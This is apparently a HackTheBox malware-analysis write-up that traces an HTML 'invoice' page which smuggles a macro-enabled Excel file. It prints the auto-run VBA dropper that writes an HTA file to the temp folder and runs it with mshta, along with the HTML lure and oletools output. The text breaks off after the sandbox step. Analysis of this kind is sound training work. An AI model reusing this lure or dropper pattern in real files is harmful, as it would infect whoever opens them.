---
title: "HTB-oBfsC4t10n"
date: 2026-02-20
draft: false
summary: " "
tags:
  - Malware Analysis
platform: Malware Analysis
---
{{< infobox platform="HackTheBox" difficulty="Hard" os="Windows" date="2026-02-20" >}}


### <span style="color:lightblue">TL;DR</span>

### <span style="color:red">initial analysis</span>
It is a .html file with one vety long line. I used a tool called `Code Beautify` to ...
```console
$ file *             
invoice-42369643.html: ASCII text, with very long lines (48949)
```

file contains a very long base64 string. I identified that this .html file downnload a `.xlsm` file.
```
h2>This file cannot be previewed. Please <a id="94dff0cf657696" href="data:&#97;pplic&#97;tion&sol;vnd.openxmlformats-officedocument.spreadsheetml.sheet;base64,UEsDBBQABgAIAAAAIQAVrOhRs...AAAAA==" download="invoice-42369643.xlsm" target="_blank">&#100;ownloa&#100;</a> the file.</h2>
```

I extracted excel file:
```console
$  echo "UEsDBBQABgAIAAAAIQAVrOhRs..." | base64 -d > mw.bin
```

Confirmed a file type: `Microsoft Excel 2007+`.
```console
$ file *
invoice-42369643.html: ASCII text, with very long lines (48949)
mw.bin:                Microsoft Excel 2007+
```

### <span style="color:red">Excel analysis</span>

The file contained a `VBA macros`.
```cosnole
$ oleid mw.bin                                                     
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: mw.bin
WARNING  For now, VBA stomping cannot be detected for files in memory
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Excel 2007+      |info      |                          
                    |Macro-Enabled       |          |                          
                    |Workbook (.xlsm)    |          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OpenXML             |info      |Container type            
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.       
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```

Used olevba to exract the malicious vba code. 
```
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |LwTHLrGh.hta        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```


```vb
Sub Auto_Open()
    Dim fHdswUyK, GgyYKuJh
    Application.Goto ("JLprrpFr")
    GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"
    
    Open GgyYKuJh For Output As #1
    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
    Close #1
    
    fHdswUyK = "msh" & "ta " & GgyYKuJh
    x = Shell(fHdswUyK, 1)
End Sub
```


by running a `vmonkey` i determine this:
```
+----------------------+-----------------------------------------------+---------------------------------+
| Action               | Parameters                                    | Description                     |
+----------------------+-----------------------------------------------+---------------------------------+
| Start Regular        |                                               | All wildcard matches will match |
| Emulation            |                                               |                                 |
| Found Entry Point    | auto_open                                     |                                 |
| Object.Method Call   | ['JLprrpFr']                                  | Application.Goto                |
| Environ              | ['temp']                                      | Interesting Function Call       |
| OPEN                 | C:\Users\admin\AppData\Local\Temp\LwTHLrGh.ht | Open File                       |
|                      | a                                             |                                 |
| Object.Method Call   | [-2147221504, '', '']                         | Err.Raise                       |
| Dropped File Hash    | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1 | File Name: LwTHLrGh.hta         |
|                      | d49c01e52ddb7875b4b                           |                                 |
| Execute Command      | mshta C:\Users\admin\AppData\Local\Temp\LwTHL | Shell function                  |
|                      | rGh.hta                                       |                                 |
| Found Entry Point    | label1_click                                  |                                 |
| Found Entry Point    | Label1_Click                                  |                                 |
+----------------------+-----------------------------------------------+---------------------------------+
```


i ran a malicious excel file in sandbox and extracted a `LwTHLrGh.hta` file.
`